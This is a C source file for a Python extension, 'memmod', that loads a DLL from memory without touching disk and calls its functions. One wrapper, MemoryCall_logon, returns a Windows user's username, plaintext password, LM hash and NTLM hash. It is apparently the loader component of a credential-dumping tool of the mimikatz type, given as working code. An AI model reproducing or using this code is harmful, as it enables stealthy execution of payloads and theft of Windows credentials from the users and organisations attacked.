#include <Python.h>
#include "logon_data.h"
#include "MemoryModule.h"

//static FILE* logfile;

static PyObject * memmod_MemoryLoadLibrary(PyObject *self, PyObject *args)
{
    const void *data;
    size_t size;
    HMEMORYMODULE handle;
	////fprintf(logfile, "[INFO] load library call\n"); fflush(logfile);
    if (!PyArg_ParseTuple(args, "t#", &data, &size))
        return NULL;
	//fprintf(logfile, "[ARGS] data: 0x%llx size: %llu\n", (unsigned _int64)data, (unsigned _int64)size); fflush(logfile);
    handle = MemoryLoadLibrary(data, size);
	//fprintf(logfile, "[INFO] recieved handle: %llu\n", (unsigned _int64)handle); fflush(logfile);
    return Py_BuildValue("n", (Py_ssize_t)handle);
}

static PyObject * memmod_MemoryGetProcAddress(PyObject *self, PyObject *args)
{
    HMEMORYMODULE handle;
    LPCSTR name;
    FARPROC func;
	//fprintf(logfile, "[INFO] get proc call\n"); fflush(logfile);
    if (!PyArg_ParseTuple(args, "ns", &handle, &name))
        return NULL;
    func = MemoryGetProcAddress(handle, name);
    return Py_BuildValue("n", (Py_ssize_t)func);
}

static PyObject * memmod_MemoryFreeLibrary(PyObject *self, PyObject *args)
{
    HMEMORYMODULE handle;
	//fprintf(logfile, "[INFO] free library call\n"); fflush(logfile);
    if (!PyArg_ParseTuple(args, "n", &handle))
        return NULL;
    MemoryFreeLibrary(handle);
    Py_RETURN_NONE;
}

static PyObject * memmod_MemoryCall_size_t(PyObject *self, PyObject *args)
{
    FARPROC func;
	//fprintf(logfile, "[INFO] callfunc (size_t) call\n"); fflush(logfile);
    if (!PyArg_ParseTuple(args, "n", &func))
        return NULL;
    size_t res = func();
    return Py_BuildValue("n", res);
}

static PyObject * memmod_MemoryCall_logon(PyObject *self, PyObject *args)
{
	LogonDataRetFunc func;
	//fprintf(logfile, "[INFO] callfunc (logon) call\n"); fflush(logfile);
    if (!PyArg_ParseTuple(args, "n", &func))
        return NULL;
    LogonData res = func();
    return Py_BuildValue("{s:u#,s:u#,s:s#,s:s#}", 
                         "username", res.username, WINDOWS_MAX_USERNAME_PASS_LENGTH,
                         "password", res.password, WINDOWS_MAX_USERNAME_PASS_LENGTH,
                         "lmHash",   res.lmHash,   LM_NTLM_HASH_LENGTH,
                         "ntlmHash", res.ntlmHash, LM_NTLM_HASH_LENGTH);
}

static PyMethodDef MemmodMethods[] = {
	{"MemoryLoadLibrary",     memmod_MemoryLoadLibrary,     METH_VARARGS,
	 "Loads dll from memory"},
	{"MemoryGetProcAddress",  memmod_MemoryGetProcAddress,  METH_VARARGS,
	 "Resolves function address"},
	{"MemoryFreeLibrary",     memmod_MemoryFreeLibrary,     METH_VARARGS,
	 "Unloads dll from memory"},
	{"MemoryCall_size_t",     memmod_MemoryCall_size_t,     METH_VARARGS,
	 "Call function withought args with size_t ret val"},
	{"MemoryCall_logon",      memmod_MemoryCall_logon,      METH_VARARGS,
	 "Call function withought args with logondata ret val"},
	{NULL, NULL, 0, NULL}        /* Sentinel */
};

PyMODINIT_FUNC initmemmod(void)
{
    (void) Py_InitModule("memmod", MemmodMethods);
	//logfile = fopen("memmod.log", "a");
}
